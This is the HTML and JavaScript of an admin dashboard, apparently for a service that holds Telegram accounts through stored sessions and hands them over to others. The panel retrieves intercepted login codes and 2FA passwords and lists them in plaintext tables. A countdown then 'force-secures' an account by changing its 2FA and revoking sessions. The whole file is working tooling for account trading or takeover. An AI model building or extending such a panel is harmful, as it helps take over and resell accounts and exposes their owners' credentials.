<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Manager - Admin Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .status-ready { background: #10b981; }
        .status-waiting_code { background: #f59e0b; }
        .status-code_sent { background: #3b82f6; }
        .status-delivered { background: #6b7280; }
        .status-force_secured { background: #ef4444; }
        .status-expired { background: #9ca3af; }
        .fade-in { animation: fadeIn 0.3s ease-in; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .pulse { animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
    </style>
</head>
<body class="bg-gray-900 text-white min-h-screen">
    <nav class="bg-gray-800 border-b border-gray-700 px-6 py-4">
        <div class="flex items-center justify-between">
            <div class="flex items-center space-x-4">
                <i class="fas fa-shield-alt text-blue-500 text-2xl"></i>
                <h1 class="text-xl font-bold">Account Manager Dashboard</h1>
            </div>
            <div class="flex items-center space-x-4">
                <span id="connection-status" class="flex items-center text-green-400">
                    <i class="fas fa-circle text-xs mr-2"></i> Connected
                </span>
                <button onclick="refreshAll()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded">
                    <i class="fas fa-sync-alt mr-2"></i> Refresh
                </button>
            </div>
        </div>
    </nav>

    <div class="flex">
        <aside class="w-64 bg-gray-800 min-h-screen p-4">
            <nav class="space-y-2">
                <a href="#delivery" onclick="showSection('delivery')" class="nav-link flex items-center px-4 py-3 rounded hover:bg-gray-700 bg-gray-700">
                    <i class="fas fa-paper-plane mr-3"></i> Delivery System
                </a>
                <a href="#accounts" onclick="showSection('accounts')" class="nav-link flex items-center px-4 py-3 rounded hover:bg-gray-700">
                    <i class="fas fa-users mr-3"></i> All Accounts
                </a>
                <a href="#credentials" onclick="showSection('credentials')" class="nav-link flex items-center px-4 py-3 rounded hover:bg-gray-700">
                    <i class="fas fa-key mr-3"></i> Credentials
                </a>
                <a href="#logs" onclick="showSection('logs')" class="nav-link flex items-center px-4 py-3 rounded hover:bg-gray-700">
                    <i class="fas fa-history mr-3"></i> Security Logs
                </a>
            </nav>
        </aside>

        <main class="flex-1 p-6">
            <!-- Delivery Section -->
            <section id="delivery-section" class="fade-in">
                <h2 class="text-2xl font-bold mb-6"><i class="fas fa-paper-plane mr-2"></i> Session Delivery</h2>
                
                <div class="bg-gray-800 rounded-lg p-6 mb-6">
                    <div class="flex items-center space-x-4">
                        <input type="text" id="phone-input" placeholder="Enter phone number (e.g. +1234567890)" 
                               class="flex-1 bg-gray-700 border border-gray-600 rounded px-4 py-3 focus:outline-none focus:border-blue-500">
                        <button onclick="checkSession()" id="btn-check" class="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded font-medium">
                            <i class="fas fa-search mr-2"></i> Check Session
                        </button>
                    </div>
                </div>

                <div id="delivery-flow" class="hidden">
                    <div class="grid grid-cols-4 gap-4 mb-6">
                        <div id="step-1" class="bg-gray-800 rounded-lg p-4 border-2 border-gray-700">
                            <div class="flex items-center mb-2">
                                <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center mr-3">1</div>
                                <span class="font-medium">Check Session</span>
                            </div>
                            <p class="text-gray-400 text-sm">Verify session availability</p>
                        </div>
                        <div id="step-2" class="bg-gray-800 rounded-lg p-4 border-2 border-gray-700">
                            <div class="flex items-center mb-2">
                                <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center mr-3">2</div>
                                <span class="font-medium">Request Code</span>
                            </div>
                            <p class="text-gray-400 text-sm">User requests login code</p>
                        </div>
                        <div id="step-3" class="bg-gray-800 rounded-lg p-4 border-2 border-gray-700">
                            <div class="flex items-center mb-2">
                                <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center mr-3">3</div>
                                <span class="font-medium">Get Code</span>
                            </div>
                            <p class="text-gray-400 text-sm">Retrieve code & password</p>
                        </div>
                        <div id="step-4" class="bg-gray-800 rounded-lg p-4 border-2 border-gray-700">
                            <div class="flex items-center mb-2">
                                <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center mr-3">4</div>
                                <span class="font-medium">Confirm</span>
                            </div>
                            <p class="text-gray-400 text-sm">Final confirmation</p>
                        </div>
                    </div>

                    <div id="delivery-content" class="bg-gray-800 rounded-lg p-6">
                        <!-- Dynamic content will be inserted here -->
                    </div>
                </div>

                <div id="delivery-result" class="hidden bg-gray-800 rounded-lg p-6 mt-6">
                    <div id="result-content"></div>
                </div>
            </section>

            <!-- Accounts Section -->
            <section id="accounts-section" class="hidden fade-in">
                <h2 class="text-2xl font-bold mb-6"><i class="fas fa-users mr-2"></i> All Accounts</h2>
                
                <div class="bg-gray-800 rounded-lg overflow-hidden">
                    <table class="w-full">
                        <thead class="bg-gray-700">
                            <tr>
                                <th class="px-4 py-3 text-left">Phone</th>
                                <th class="px-4 py-3 text-left">Name</th>
                                <th class="px-4 py-3 text-left">Status</th>
                                <th class="px-4 py-3 text-left">Delivery</th>
                                <th class="px-4 py-3 text-left">Sessions</th>
                                <th class="px-4 py-3 text-left">Timer</th>
                                <th class="px-4 py-3 text-left">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="accounts-table">
                            <tr><td colspan="7" class="text-center py-8 text-gray-400">Loading...</td></tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <!-- Credentials Section -->
            <section id="credentials-section" class="hidden fade-in">
                <h2 class="text-2xl font-bold mb-6"><i class="fas fa-key mr-2"></i> Credentials (Restricted)</h2>
                
                <div class="bg-yellow-900/50 border border-yellow-600 rounded-lg p-4 mb-6">
                    <i class="fas fa-exclamation-triangle text-yellow-400 mr-2"></i>
                    <span class="text-yellow-200">Warning: This section contains sensitive information. Handle with care.</span>
                </div>
                
                <div class="bg-gray-800 rounded-lg overflow-hidden">
                    <table class="w-full">
                        <thead class="bg-gray-700">
                            <tr>
                                <th class="px-4 py-3 text-left">Phone</th>
                                <th class="px-4 py-3 text-left">2FA Password</th>
                                <th class="px-4 py-3 text-left">Last Code</th>
                                <th class="px-4 py-3 text-left">Created</th>
                                <th class="px-4 py-3 text-left">Delivered</th>
                            </tr>
                        </thead>
                        <tbody id="credentials-table">
                            <tr><td colspan="5" class="text-center py-8 text-gray-400">Loading...</td></tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <!-- Logs Section -->
            <section id="logs-section" class="hidden fade-in">
                <h2 class="text-2xl font-bold mb-6"><i class="fas fa-history mr-2"></i> Security Logs</h2>
                
                <div class="flex items-center space-x-4 mb-6">
                    <input type="text" id="log-filter-phone" placeholder="Filter by phone..." 
                           class="bg-gray-700 border border-gray-600 rounded px-4 py-2 focus:outline-none focus:border-blue-500">
                    <button onclick="loadLogs()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded">
                        <i class="fas fa-filter mr-2"></i> Filter
                    </button>
                </div>
                
                <div class="bg-gray-800 rounded-lg overflow-hidden max-h-96 overflow-y-auto">
                    <table class="w-full">
                        <thead class="bg-gray-700 sticky top-0">
                            <tr>
                                <th class="px-4 py-3 text-left">Time</th>
                                <th class="px-4 py-3 text-left">Phone</th>
                                <th class="px-4 py-3 text-left">Action</th>
                                <th class="px-4 py-3 text-left">Status</th>
                                <th class="px-4 py-3 text-left">Details</th>
                            </tr>
                        </thead>
                        <tbody id="logs-table">
                            <tr><td colspan="5" class="text-center py-8 text-gray-400">Loading...</td></tr>
                        </tbody>
                    </table>
                </div>
            </section>
        </main>
    </div>

    <!-- Confirmation Modal -->
    <div id="confirm-modal" class="hidden fixed inset-0 bg-black/50 flex items-center justify-center z-50">
        <div class="bg-gray-800 rounded-lg p-6 max-w-md w-full mx-4">
            <h3 class="text-xl font-bold mb-4" id="modal-title">Confirm Action</h3>
            <p class="text-gray-300 mb-6" id="modal-message">Are you sure?</p>
            <div class="flex justify-end space-x-4">
                <button onclick="closeModal()" class="px-4 py-2 bg-gray-600 rounded hover:bg-gray-700">Cancel</button>
                <button onclick="confirmModalAction()" id="modal-confirm-btn" class="px-4 py-2 bg-red-600 rounded hover:bg-red-700">Confirm</button>
            </div>
        </div>
    </div>

    <script>
        const API_BASE = '/api/v1/delivery';
        let currentPhone = '';
        let currentStep = 0;
        let modalCallback = null;
        let countdownIntervals = {};

        function showSection(section) {
            document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
            document.getElementById(`${section}-section`).classList.remove('hidden');
            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('bg-gray-700'));
            event.target.closest('.nav-link').classList.add('bg-gray-700');
            
            if (section === 'accounts') loadAccounts();
            if (section === 'credentials') loadAccounts();
            if (section === 'logs') loadLogs();
        }

        async function checkSession() {
            const phone = document.getElementById('phone-input').value.trim();
            if (!phone) return showError('Please enter a phone number');
            
            currentPhone = phone;
            setLoading('btn-check', true);
            
            try {
                const res = await fetch(`${API_BASE}/check-session`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone_number: phone })
                });
                const data = await res.json();
                
                if (data.status === 'success') {
                    document.getElementById('delivery-flow').classList.remove('hidden');
                    updateStep(1, 'completed');
                    showStep2();
                } else {
                    showError(data.error || data.detail || 'Session not available');
                }
            } catch (e) {
                showError(e.message);
            } finally {
                setLoading('btn-check', false);
            }
        }

        function showStep2() {
            updateStep(2, 'active');
            document.getElementById('delivery-content').innerHTML = `
                <div class="text-center py-8">
                    <i class="fas fa-mobile-alt text-6xl text-blue-400 mb-4"></i>
                    <h3 class="text-xl font-bold mb-2">Request Login Code</h3>
                    <p class="text-gray-400 mb-6">Please request a login code from the official Telegram app, then click the button below.</p>
                    <button onclick="requestCode()" id="btn-request-code" class="bg-blue-600 hover:bg-blue-700 px-8 py-3 rounded-lg font-medium">
                        <i class="fas fa-check mr-2"></i> I've Requested the Code
                    </button>
                </div>
            `;
        }

        async function requestCode() {
            setLoading('btn-request-code', true);
            
            try {
                const res = await fetch(`${API_BASE}/request-code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone_number: currentPhone })
                });
                const data = await res.json();
                
                if (data.status === 'success') {
                    updateStep(2, 'completed');
                    showStep3();
                } else {
                    showError(data.error || data.detail);
                }
            } catch (e) {
                showError(e.message);
            } finally {
                setLoading('btn-request-code', false);
            }
        }

        function showStep3() {
            updateStep(3, 'active');
            document.getElementById('delivery-content').innerHTML = `
                <div class="text-center py-8">
                    <i class="fas fa-spinner fa-spin text-6xl text-yellow-400 mb-4"></i>
                    <h3 class="text-xl font-bold mb-2">Waiting for Code...</h3>
                    <p class="text-gray-400 mb-6">The system is waiting for the login code to arrive.</p>
                    <button onclick="getCode()" id="btn-get-code" class="bg-green-600 hover:bg-green-700 px-8 py-3 rounded-lg font-medium">
                        <i class="fas fa-download mr-2"></i> Retrieve Code
                    </button>
                </div>
            `;
        }

        async function getCode() {
            setLoading('btn-get-code', true);
            
            try {
                const res = await fetch(`${API_BASE}/get-code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone_number: currentPhone })
                });
                const data = await res.json();
                
                if (data.status === 'success') {
                    updateStep(3, 'completed');
                    showStep4(data);
                } else if (data.status === 'waiting') {
                    showInfo(data.message);
                } else {
                    showError(data.error || data.detail);
                }
            } catch (e) {
                showError(e.message);
            } finally {
                setLoading('btn-get-code', false);
            }
        }

        function showStep4(data) {
            updateStep(4, 'active');
            
            const deadline = new Date(data.confirmation_deadline);
            
            document.getElementById('delivery-content').innerHTML = `
                <div class="grid grid-cols-2 gap-6">
                    <div class="bg-gray-700 rounded-lg p-6">
                        <h4 class="text-lg font-bold mb-4"><i class="fas fa-key text-blue-400 mr-2"></i> Login Code</h4>
                        <div class="text-4xl font-mono font-bold text-blue-400">${data.code}</div>
                    </div>
                    <div class="bg-gray-700 rounded-lg p-6">
                        <h4 class="text-lg font-bold mb-4"><i class="fas fa-lock text-green-400 mr-2"></i> 2FA Password</h4>
                        <div class="text-lg font-mono text-green-400 break-all">${data.password || 'No 2FA'}</div>
                    </div>
                </div>
                
                <div class="mt-6 bg-red-900/30 border border-red-600 rounded-lg p-4">
                    <div class="flex items-center justify-between">
                        <div>
                            <i class="fas fa-clock text-red-400 mr-2"></i>
                            <span class="text-red-200">Confirmation deadline:</span>
                        </div>
                        <div id="countdown" class="text-2xl font-bold text-red-400">${data.timeout_minutes}:00</div>
                    </div>
                    <p class="text-red-300 text-sm mt-2">If not confirmed within timeout and new session detected, account will be force-secured.</p>
                </div>
                
                <div class="mt-6 text-center">
                    <button onclick="confirmDelivery()" id="btn-confirm" class="bg-green-600 hover:bg-green-700 px-8 py-4 rounded-lg font-medium text-lg">
                        <i class="fas fa-check-circle mr-2"></i> I Have Logged In Successfully
                    </button>
                </div>
            `;
            
            startCountdown(deadline);
        }

        function startCountdown(deadline) {
            const countdownEl = document.getElementById('countdown');
            if (!countdownEl) return;
            
            const interval = setInterval(() => {
                const now = new Date();
                const diff = deadline - now;
                
                if (diff <= 0) {
                    clearInterval(interval);
                    countdownEl.textContent = 'EXPIRED';
                    return;
                }
                
                const mins = Math.floor(diff / 60000);
                const secs = Math.floor((diff % 60000) / 1000);
                countdownEl.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
            }, 1000);
        }

        async function confirmDelivery() {
            setLoading('btn-confirm', true);
            
            try {
                const res = await fetch(`${API_BASE}/confirm`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone_number: currentPhone })
                });
                const data = await res.json();
                
                if (data.status === 'success') {
                    updateStep(4, 'completed');
                    document.getElementById('delivery-content').innerHTML = `
                        <div class="text-center py-12">
                            <i class="fas fa-check-circle text-8xl text-green-400 mb-6"></i>
                            <h3 class="text-2xl font-bold text-green-400 mb-2">Delivery Complete!</h3>
                            <p class="text-gray-400">${data.message}</p>
                            <div class="mt-4 text-sm text-gray-500">
                                ${data.logout_results ? data.logout_results.join(' | ') : ''}
                            </div>
                        </div>
                    `;
                } else {
                    showError(data.error || data.detail);
                }
            } catch (e) {
                showError(e.message);
            } finally {
                setLoading('btn-confirm', false);
            }
        }

        function updateStep(step, status) {
            for (let i = 1; i <= 4; i++) {
                const el = document.getElementById(`step-${i}`);
                el.classList.remove('border-green-500', 'border-blue-500', 'border-gray-700');
                
                if (i < step) {
                    el.classList.add('border-green-500');
                    el.querySelector('div > div').classList.remove('bg-gray-600', 'bg-blue-600');
                    el.querySelector('div > div').classList.add('bg-green-600');
                } else if (i === step && status === 'active') {
                    el.classList.add('border-blue-500');
                    el.querySelector('div > div').classList.remove('bg-gray-600', 'bg-green-600');
                    el.querySelector('div > div').classList.add('bg-blue-600');
                } else if (i === step && status === 'completed') {
                    el.classList.add('border-green-500');
                    el.querySelector('div > div').classList.remove('bg-gray-600', 'bg-blue-600');
                    el.querySelector('div > div').classList.add('bg-green-600');
                } else {
                    el.classList.add('border-gray-700');
                }
            }
        }

        async function loadAccounts() {
            try {
                const res = await fetch(`${API_BASE}/accounts`);
                const data = await res.json();
                
                if (data.status === 'success') {
                    renderAccountsTable(data.accounts);
                    renderCredentialsTable(data.accounts);
                }
            } catch (e) {
                console.error('Error loading accounts:', e);
            }
        }

        function renderAccountsTable(accounts) {
            const tbody = document.getElementById('accounts-table');
            if (!accounts.length) {
                tbody.innerHTML = '<tr><td colspan="7" class="text-center py-8 text-gray-400">No accounts found</td></tr>';
                return;
            }
            
            tbody.innerHTML = accounts.map(acc => `
                <tr class="border-t border-gray-700 hover:bg-gray-700/50">
                    <td class="px-4 py-3 font-mono">${acc.phone}</td>
                    <td class="px-4 py-3">${acc.first_name || '-'}</td>
                    <td class="px-4 py-3">
                        <span class="px-2 py-1 rounded text-xs bg-gray-600">${acc.status || '-'}</span>
                    </td>
                    <td class="px-4 py-3">
                        <span class="px-2 py-1 rounded text-xs status-${acc.delivery_status || 'none'}">${acc.delivery_status || '-'}</span>
                    </td>
                    <td class="px-4 py-3">
                        ${acc.has_pyrogram ? '<i class="fas fa-check text-green-400 mr-1" title="Pyrogram"></i>' : '<i class="fas fa-times text-red-400 mr-1"></i>'}
                        ${acc.has_telethon ? '<i class="fas fa-check text-green-400" title="Telethon"></i>' : '<i class="fas fa-times text-red-400"></i>'}
                    </td>
                    <td class="px-4 py-3 text-sm">
                        ${acc.confirmation_deadline ? `<span class="text-yellow-400" id="timer-${acc.phone}">${formatDeadline(acc.confirmation_deadline)}</span>` : '-'}
                    </td>
                    <td class="px-4 py-3">
                        <button onclick="forceSecure('${acc.phone}')" class="text-yellow-400 hover:text-yellow-300 mr-2" title="Force Secure">
                            <i class="fas fa-shield-alt"></i>
                        </button>
                        <button onclick="deleteAccount('${acc.phone}')" class="text-red-400 hover:text-red-300" title="Delete">
                            <i class="fas fa-trash"></i>
                        </button>
                    </td>
                </tr>
            `).join('');
        }

        function renderCredentialsTable(accounts) {
            const tbody = document.getElementById('credentials-table');
            if (!accounts.length) {
                tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 text-gray-400">No accounts found</td></tr>';
                return;
            }
            
            tbody.innerHTML = accounts.map(acc => `
                <tr class="border-t border-gray-700 hover:bg-gray-700/50">
                    <td class="px-4 py-3 font-mono">${acc.phone}</td>
                    <td class="px-4 py-3 font-mono text-green-400">${acc.password || '<span class="text-gray-500">None</span>'}</td>
                    <td class="px-4 py-3 font-mono text-blue-400">${acc.last_code || '<span class="text-gray-500">-</span>'}</td>
                    <td class="px-4 py-3 text-sm text-gray-400">${acc.created_at ? new Date(acc.created_at).toLocaleString() : '-'}</td>
                    <td class="px-4 py-3 text-sm text-gray-400">${acc.delivered_at ? new Date(acc.delivered_at).toLocaleString() : '-'}</td>
                </tr>
            `).join('');
        }

        async function loadLogs() {
            const phone = document.getElementById('log-filter-phone').value.trim();
            
            try {
                const url = phone ? `${API_BASE}/logs?phone=${phone}` : `${API_BASE}/logs`;
                const res = await fetch(url);
                const data = await res.json();
                
                if (data.status === 'success') {
                    renderLogsTable(data.logs);
                }
            } catch (e) {
                console.error('Error loading logs:', e);
            }
        }

        function renderLogsTable(logs) {
            const tbody = document.getElementById('logs-table');
            if (!logs.length) {
                tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 text-gray-400">No logs found</td></tr>';
                return;
            }
            
            tbody.innerHTML = logs.map(log => `
                <tr class="border-t border-gray-700 hover:bg-gray-700/50">
                    <td class="px-4 py-3 text-sm text-gray-400">${new Date(log.created_at).toLocaleString()}</td>
                    <td class="px-4 py-3 font-mono">${log.phone}</td>
                    <td class="px-4 py-3">${log.action}</td>
                    <td class="px-4 py-3">
                        <span class="px-2 py-1 rounded text-xs ${log.status === 'success' ? 'bg-green-600' : log.status === 'failed' ? 'bg-red-600' : 'bg-yellow-600'}">${log.status}</span>
                    </td>
                    <td class="px-4 py-3 text-sm text-gray-400 max-w-xs truncate">${log.details || '-'}</td>
                </tr>
            `).join('');
        }

        function formatDeadline(deadline) {
            const diff = new Date(deadline) - new Date();
            if (diff <= 0) return 'EXPIRED';
            const mins = Math.floor(diff / 60000);
            const secs = Math.floor((diff % 60000) / 1000);
            return `${mins}:${secs.toString().padStart(2, '0')}`;
        }

        async function forceSecure(phone) {
            showModal('Force Secure Account', `Are you sure you want to force secure ${phone}? This will change the 2FA password and revoke all sessions.`, async () => {
                try {
                    const res = await fetch(`${API_BASE}/force-secure`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone_number: phone })
                    });
                    const data = await res.json();
                    
                    if (data.status === 'success') {
                        showSuccess('Account force secured successfully');
                        loadAccounts();
                    } else {
                        showError(data.error || data.detail);
                    }
                } catch (e) {
                    showError(e.message);
                }
            });
        }

        async function deleteAccount(phone) {
            showModal('Delete Account', `Are you sure you want to delete ${phone}? This action cannot be undone.`, async () => {
                try {
                    const res = await fetch(`${API_BASE}/account/${phone}`, { method: 'DELETE' });
                    const data = await res.json();
                    
                    if (data.status === 'success') {
                        showSuccess('Account deleted successfully');
                        loadAccounts();
                    } else {
                        showError(data.error || data.detail);
                    }
                } catch (e) {
                    showError(e.message);
                }
            });
        }

        function showModal(title, message, callback) {
            document.getElementById('modal-title').textContent = title;
            document.getElementById('modal-message').textContent = message;
            document.getElementById('confirm-modal').classList.remove('hidden');
            modalCallback = callback;
        }

        function closeModal() {
            document.getElementById('confirm-modal').classList.add('hidden');
            modalCallback = null;
        }

        function confirmModalAction() {
            if (modalCallback) modalCallback();
            closeModal();
        }

        function refreshAll() {
            loadAccounts();
            loadLogs();
        }

        function setLoading(btnId, loading) {
            const btn = document.getElementById(btnId);
            if (!btn) return;
            btn.disabled = loading;
            if (loading) {
                btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Loading...';
            }
        }

        function showError(msg) {
            alert('Error: ' + msg);
        }

        function showSuccess(msg) {
            alert('Success: ' + msg);
        }

        function showInfo(msg) {
            alert('Info: ' + msg);
        }

        document.addEventListener('DOMContentLoaded', () => {
            loadAccounts();
            setInterval(loadAccounts, 30000);
        });
    </script>
</body>
</html>
